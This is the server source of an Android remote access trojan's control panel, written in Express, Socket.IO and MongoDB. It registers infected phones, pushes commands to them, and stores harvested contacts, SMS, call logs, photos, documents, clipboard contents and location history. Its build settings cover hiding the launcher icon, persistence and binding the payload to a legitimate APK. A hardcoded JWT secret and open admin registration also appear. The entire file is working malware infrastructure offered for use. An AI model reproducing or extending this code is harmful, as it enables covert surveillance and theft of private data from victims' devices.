const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const morgan = require('morgan');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs'); 
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));
app.use(morgan('dev'));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/rat_panel', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('MongoDB Connected'))
  .catch(err => console.log('MongoDB Error:', err));

// Device Schema - use strict:false and Mixed types for flexible data
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true, required: true },
  alias: String,
  status: { type: String, default: 'offline', enum: ['online', 'offline', 'sleeping'] },
  ip: String,
  country: String,
  city: String,
  isp: String,
  os: String,
  osVersion: String,
  deviceModel: String,
  manufacturer: String,
  batteryLevel: Number,
  isCharging: Boolean,
  lastSeen: { type: Date, default: Date.now },
  firstSeen: { type: Date, default: Date.now },
  permissions: {
    camera: Boolean,
    location: Boolean,
    sms: Boolean,
    contacts: Boolean,
    storage: Boolean,
    microphone: Boolean,
    phone: Boolean,
    notifications: Boolean
  },
  apkVersion: String,
  isHidden: { type: Boolean, default: false },
  hiddenAt: Date,
  commands: [mongoose.Schema.Types.Mixed],
  data: {
    type: Map,
    of: mongoose.Schema.Types.Mixed,
    default: {}
  }
}, { timestamps: true, strict: false });

const Device = mongoose.model('Device', DeviceSchema);

// Admin Schema
const AdminSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  email: String,
  apiKey: String,
  twoFactorSecret: String,
  isTwoFactorEnabled: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const Admin = mongoose.model('Admin', AdminSchema);

// APK Build Schema
const ApkBuildSchema = new mongoose.Schema({
  buildId: { type: String, unique: true },
  name: String,
  packageName: String,
  icon: String,
  version: String,
  bindWithApk: String,
  serverUrl: String,
  wsUrl: String,
  hideAfterInstall: { type: Boolean, default: false },
  hideLauncher: { type: Boolean, default: true },
  persistence: { type: Boolean, default: true },
  adminFeatures: {
    camera: { type: Boolean, default: true },
    microphone: { type: Boolean, default: true },
    location: { type: Boolean, default: true },
    sms: { type: Boolean, default: true },
    calls: { type: Boolean, default: true },
    contacts: { type: Boolean, default: true },
    storage: { type: Boolean, default: true },
    notifications: { type: Boolean, default: true }
  },
  createdAt: { type: Date, default: Date.now },
  downloads: { type: Number, default: 0 }
});

const ApkBuild = mongoose.model('ApkBuild', ApkBuildSchema);

// Authentication Middleware
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
    req.adminId = decoded.id;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Socket.IO - Device Communication
io.use(async (socket, next) => {
  const { deviceId, type } = socket.handshake.query;
  if (type === 'device') {
    socket.deviceId = deviceId;
    return next();
  }
  const token = socket.handshake.auth.token;
  if (token) {
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
      socket.adminId = decoded.id;
      return next();
    } catch (err) {
      return next(new Error('Authentication error'));
    }
  }
  next();
});

io.on('connection', async (socket) => {
  console.log('New connection:', socket.id);

  // Device connection
  if (socket.deviceId) {
    try {
      const device = await Device.findOneAndUpdate(
        { deviceId: socket.deviceId },
        { 
          status: 'online', 
          lastSeen: new Date(),
          ip: socket.handshake.address
        },
        { upsert: true, new: true }
      );
      
      socket.join(`device:${socket.deviceId}`);
      
      // Notify admin panels
      io.emit('device:online', { deviceId: socket.deviceId, device });
      
      // Send pending commands
      const pendingCommands = (device.commands || []).filter(c => c && c.status === 'pending');
      pendingCommands.forEach(cmd => {
        socket.emit('command', cmd);
      });

      socket.on('device:update', async (data) => {
        try {
          // Only update specific fields, not the raw data
          const allowedFields = {};
          if (data.os) allowedFields.os = data.os;
          if (data.osVersion) allowedFields.osVersion = data.osVersion;
          if (data.deviceModel) allowedFields.deviceModel = data.deviceModel;
          if (data.manufacturer) allowedFields.manufacturer = data.manufacturer;
          if (data.batteryLevel != null) allowedFields.batteryLevel = data.batteryLevel;
          if (data.isCharging != null) allowedFields.isCharging = data.isCharging;
          if (data.ip) allowedFields.ip = data.ip;
          if (data.apiLevel) allowedFields.apiLevel = data.apiLevel;
          if (data.apkVersion) allowedFields.apkVersion = data.apkVersion;
          if (data.permissions) allowedFields.permissions = data.permissions;
          allowedFields.lastSeen = new Date();
          allowedFields.status = 'online';
          
          await Device.findOneAndUpdate(
            { deviceId: socket.deviceId },
            allowedFields
          );
          io.emit('device:data', { deviceId: socket.deviceId, data });
        } catch (err) {
          console.error('Update error:', err.message);
        }
      });

      socket.on('device:result', async (data) => {
        try {
          const { commandId, result, status } = data;
          if (!commandId) return;
          
          // Sanitize result - convert to plain object
          const cleanResult = result ? JSON.parse(JSON.stringify(result)) : null;

          // Helper: extract array from a possibly-wrapped object
          const extractFromResult = (val, preferredKey) => {
            if (!val) return val;
            if (Array.isArray(val)) return val;
            if (typeof val === 'object') {
              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
              for (const k of Object.keys(val)) {
                if (Array.isArray(val[k])) return val[k];
              }
            }
            return val;
          };

          // Also persist result data into device.data so admin panel can display it
          const dataSetOps = {};
          if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
            if (cleanResult.contacts)              dataSetOps['data.contacts']      = extractFromResult(cleanResult.contacts, 'contacts');
            if (cleanResult.sms)                   dataSetOps['data.sms']           = extractFromResult(cleanResult.sms, 'sms');
            if (cleanResult.callLogs)              dataSetOps['data.callLogs']      = extractFromResult(cleanResult.callLogs, 'callLogs');
            if (cleanResult.installedApps)         dataSetOps['data.installedApps'] = extractFromResult(cleanResult.installedApps, 'installedApps');
            if (cleanResult.deviceInfo)            dataSetOps['data.deviceInfo']    = cleanResult.deviceInfo;
            if (cleanResult.photos || cleanResult.images) dataSetOps['data.photos'] = extractFromResult(cleanResult.photos || cleanResult.images, 'images');
            if (cleanResult.videos)                dataSetOps['data.videos']        = extractFromResult(cleanResult.videos, 'videos');
            if (cleanResult.documents)             dataSetOps['data.documents']     = extractFromResult(cleanResult.documents, 'documents');
            if (cleanResult.battery)               dataSetOps['data.battery']       = cleanResult.battery;
            if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
            if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
            if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
          }

          const updateDoc = {
            $push: {
              commands: {
                commandId,
                status: status || 'executed',
                result: cleanResult,
                executedAt: new Date()
              }
            }
          };
          if (Object.keys(dataSetOps).length > 0) {
            updateDoc.$set = dataSetOps;
          }

          await mongoose.connection.db.collection('devices').updateOne(
            { deviceId: socket.deviceId },
            updateDoc
          );

          io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result: cleanResult, status });
          // Notify admin panels that device data was updated so UI can refresh
          io.emit('device:data:update', { deviceId: socket.deviceId });
        } catch (err) {
          console.error('Result error:', err.message);
        }
      });

      socket.on('device:data:bulk', async (data) => {
        try {
          // Helper to extract the actual array from a possibly-wrapped object.
          // Android wraps arrays like: { contacts: [...] } or { sms: [...], total: N }
          // We look for the preferred key first, then fall back to any array value.
          const extractArray = (val, preferredKey) => {
            if (!val) return val;
            if (Array.isArray(val)) return val;
            if (typeof val === 'object') {
              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
              for (const k of Object.keys(val)) {
                if (Array.isArray(val[k])) return val[k];
              }
            }
            return val;
          };

          // Build $set fields for each known data type
          // Android key → preferred inner key (for unwrapping)
          const dataKeyMap = {
            contacts:     'contacts',
            sms:          'sms',
            callLogs:     'callLogs',
            photos:       'images',   // getMediaFiles("images") wraps as { images: [...] }
            videos:       'videos',
            documents:    'documents',
            installedApps:'installedApps'
          };

          const setOps = {};
          Object.entries(dataKeyMap).forEach(([key, innerKey]) => {
            if (data[key] != null) {
              setOps[`data.${key}`] = extractArray(data[key], innerKey);
            }
          });

          // Handle scalar / object special fields
          if (data.deviceInfo)   setOps['data.deviceInfo']   = data.deviceInfo;
          if (data.battery)      setOps['data.battery']      = data.battery;
          if (data.simInfo)      setOps['data.simInfo']      = data.simInfo;
          if (data.networkInfo)  setOps['data.networkInfo']  = data.networkInfo;
          if (data.clipboard)    setOps['data.clipboard']    = data.clipboard;

          // Build the full MongoDB update document
          const updateDoc = {};
          if (Object.keys(setOps).length > 0) {
            updateDoc.$set = setOps;
          }

          // Location must use $push (separate operator — NOT inside $set)
          if (data.location && (data.location.lat != null || data.location.lng != null)) {
            updateDoc.$push = {
              'data.locations': { ...data.location, timestamp: new Date() }
            };
          }

          if (Object.keys(updateDoc).length > 0) {
            await mongoose.connection.db.collection('devices').updateOne(
              { deviceId: socket.deviceId },
              updateDoc
            );
            console.log(`Bulk data saved for ${socket.deviceId}:`, Object.keys(setOps).join(', '));
          }

          io.emit('device:data:update', { deviceId: socket.deviceId });
        } catch (err) {
          console.error('Bulk data error:', err.message);
        }
      });

      socket.on('disconnect', async () => {
        console.log('Device disconnected:', socket.deviceId);
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { status: 'offline', lastSeen: new Date() }
        );
        io.emit('device:offline', { deviceId: socket.deviceId });
      });

      socket.on('device:ping', async () => {
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { lastSeen: new Date(), status: 'online' }
        );
        socket.emit('device:pong');
      });

    } catch (err) {
      console.error('Device connection error:', err);
    }
  }

  // Admin panel connection
  if (socket.adminId) {
    socket.join('admin');
    
    socket.on('command:send', async (data) => {
      try {
        const { deviceId, type, params } = data;
        const commandId = uuidv4();
        
        await Device.findOneAndUpdate(
          { deviceId },
          { 
            $push: { 
              commands: {
                commandId,
                type,
                params,
                status: 'pending',
                createdAt: new Date()
              }
            }
          }
        );
        
        io.to(`device:${deviceId}`).emit('command', { commandId, type, params });
        socket.emit('command:sent', { commandId, deviceId, type });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });

    socket.on('command:send:immediate', async (data) => {
      try {
        const { deviceId, type, params } = data;
        io.to(`device:${deviceId}`).emit('command', { 
          commandId: 'immediate_' + Date.now(), 
          type, 
          params,
          immediate: true
        });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });
  }
});

// === REST API Routes ===

// Auth Routes
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
    
    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) return res.status(401).json({ error: 'Invalid credentials' });
    
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password, email } = req.body;
    
    const existingUser = await Admin.findOne({ username });
    if (existingUser) {
      return res.status(400).json({ error: 'Username already exists' });
    }
    
    const hashedPassword = await bcrypt.hash(password, 12);
    const admin = new Admin({ username, password: hashedPassword, email, apiKey: uuidv4() });
    await admin.save();
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    if (err.code === 11000) {
      return res.status(400).json({ error: 'Username already exists' });
    }
    res.status(500).json({ error: err.message });
  }
});

// Devices Routes
app.get('/api/devices', authMiddleware, async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 }).lean();
    res.json(devices);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    // Mongoose Map type can come back as a JS Map object even after .lean()
    // Convert to a plain object so the frontend can access device.data.contacts etc.
    if (device.data instanceof Map) {
      device.data = Object.fromEntries(device.data);
    }
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
  try {
    const { type, params } = req.body;
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    const commandId = uuidv4();
    device.commands.push({
      commandId,
      type,
      params,
      status: 'pending',
      createdAt: new Date()
    });
    await device.save();
    
    io.to(`device:${req.params.deviceId}`).emit('command', { commandId, type, params });
    
    res.json({ commandId, status: 'pending' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// APK Build Routes
app.post('/api/apk/build', authMiddleware, async (req, res) => {
  try {
    const buildData = req.body;
    const buildId = uuidv4();
    
    const build = new ApkBuild({
      buildId,
      ...buildData,
      serverUrl: buildData.serverUrl || process.env.SERVER_URL || 'http://localhost:5000',
      wsUrl: buildData.wsUrl || process.env.WS_URL || 'http://localhost:5000',
      status: 'configured',
      createdAt: new Date()
    });
    await build.save();

    const buildDir = path.join(__dirname, 'builds', 'scripts');
    if (!fs.existsSync(buildDir)) {
      fs.mkdirSync(buildDir, { recursive: true });
    }

    res.json({ 
      buildId, 
      message: 'Build configuration saved.',
      status: 'configured',
      note: 'Download the android-agent directory and build locally with Android SDK.'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/apk/builds', authMiddleware, async (req, res) => {
  try {
    const builds = await ApkBuild.find().sort({ createdAt: -1 });
    res.json(builds);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
  try {
    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
    if (!build) return res.status(404).json({ error: 'Build not found' });
    res.json({
      buildId: build.buildId,
      status: build.status || 'configured',
      name: build.name,
      version: build.version,
      packageName: build.packageName,
      serverUrl: build.serverUrl,
      message: build.status === 'configured' ? 'Build configured. Run build script locally.' : '',
      createdAt: build.createdAt
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Stats Routes
app.get('/api/stats', authMiddleware, async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const onlineDevices = await Device.countDocuments({ status: 'online' });
    const todayNew = await Device.countDocuments({
      firstSeen: { $gte: new Date(new Date().setHours(0,0,0,0)) }
    });
    
    res.json({
      totalDevices,
      onlineDevices,
      todayNew,
      totalCommands: 0
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
  try {
    const { deviceId, dataType } = req.params;
    const device = await Device.findOne({ deviceId }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    const data = device.data || {};
    res.json(data[dataType] || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`WebSocket server ready`);
});